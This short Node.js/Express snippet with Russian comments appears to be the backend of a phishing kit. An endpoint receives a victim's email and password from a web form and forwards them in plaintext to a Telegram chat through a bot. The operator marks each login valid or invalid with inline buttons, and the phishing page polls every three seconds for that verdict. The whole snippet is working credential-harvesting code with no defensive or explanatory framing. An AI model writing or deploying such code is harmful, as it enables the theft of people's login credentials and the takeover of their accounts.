const requests = {}; // Хранилище статусов

// Сайт вызывает это при вводе пароля
app.post('/send-data', (req, res) => {
    const { userId, email, pass } = req.body;
    requests[userId] = 'pending';
    
    // Отправка в ТГ (используй библиотеку или axios)
    bot.sendMessage(chatId, `Логин: ${email}\nПароль: ${pass}`, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ Ок", callback_data: `ok_${userId}` },
                { text: "❌ Ошибка", callback_data: `err_${userId}` }
            ]]
        }
    });
    res.send({ sent: true });
});

// Бот вызывает это при нажатии кнопок
bot.on('callback_query', (query) => {
    const [action, id] = query.data.split('_');
    requests[id] = (action === 'ok') ? 'success' : 'error';
    bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
});

// Сайт вызывает это каждые 3 сек
app.get('/check-status/:userId', (req, res) => {
    res.send({ status: requests[req.params.userId] || 'pending' });
});
